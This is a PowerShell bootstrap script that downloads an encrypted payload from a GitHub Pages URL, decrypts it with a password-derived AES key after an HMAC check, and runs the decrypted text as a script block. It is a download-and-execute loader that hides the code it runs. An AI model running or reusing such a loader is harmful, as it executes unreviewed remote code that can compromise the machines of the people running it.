param(
    [string]$PayloadUrl = "https://vtlowkey.github.io/bootstrap/Payload.enc",
    [string]$Password = ""
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Test-MacEqual([byte[]]$Left, [byte[]]$Right) {
    if ($Left.Length -ne $Right.Length) { return $false }
    $diff = 0
    for ($i = 0; $i -lt $Left.Length; $i++) {
        $diff = $diff -bor ($Left[$i] -bxor $Right[$i])
    }
    return ($diff -eq 0)
}

function Decrypt-Payload([byte[]]$Data, [string]$Password) {
    if ($Data.Length -lt 65) { throw "Invalid encrypted file." }

    $salt = New-Object byte[] 16
    $iv = New-Object byte[] 16
    $storedMac = New-Object byte[] 32
    $cipher = New-Object byte[] ($Data.Length - 64)
    [Array]::Copy($Data, 0, $salt, 0, 16)
    [Array]::Copy($Data, 16, $iv, 0, 16)
    [Array]::Copy($Data, 32, $storedMac, 0, 32)
    [Array]::Copy($Data, 64, $cipher, 0, $cipher.Length)

    $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
        $Password, $salt, 150000,
        [System.Security.Cryptography.HashAlgorithmName]::SHA256
    )
    $material = $kdf.GetBytes(64)
    $encKey = New-Object byte[] 32
    $macKey = New-Object byte[] 32
    [Array]::Copy($material, 0, $encKey, 0, 32)
    [Array]::Copy($material, 32, $macKey, 0, 32)

    $macInput = New-Object byte[] (16 + $cipher.Length)
    [Array]::Copy($iv, 0, $macInput, 0, 16)
    [Array]::Copy($cipher, 0, $macInput, 16, $cipher.Length)

    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $macKey
    $actualMac = $hmac.ComputeHash($macInput)
    $hmac.Dispose()

    if (-not (Test-MacEqual $storedMac $actualMac)) {
        throw "Wrong password or corrupted file."
    }

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $encKey
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $plain = $decryptor.TransformFinalBlock($cipher, 0, $cipher.Length)
    $decryptor.Dispose()
    $aes.Dispose()

    return [Text.Encoding]::UTF8.GetString($plain)
}

Write-Host "Downloading encrypted payload..." -ForegroundColor Cyan
if (Test-Path -LiteralPath $PayloadUrl -PathType Leaf) {
    $encrypted = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $PayloadUrl))
}
else {
    try {
        $wc = New-Object System.Net.WebClient
        $encrypted = $wc.DownloadData($PayloadUrl)
        $wc.Dispose()
    }
    catch {
        throw "Failed to download encrypted payload."
    }
}

if ([string]::IsNullOrWhiteSpace($Password)) {
    $Password = $env:LANZOU_PAYLOAD_KEY
}
if ([string]::IsNullOrWhiteSpace($Password)) {
    $secure = Read-Host "Enter decryption password" -AsSecureString
    $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
    try { $Password = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr) }
    finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
}

Write-Host "Decrypting..." -ForegroundColor Cyan
$plainText = Decrypt-Payload $encrypted $Password
Write-Host "Decrypted. Executing..." -ForegroundColor Green
$scriptBlock = [ScriptBlock]::Create($plainText)
& $scriptBlock
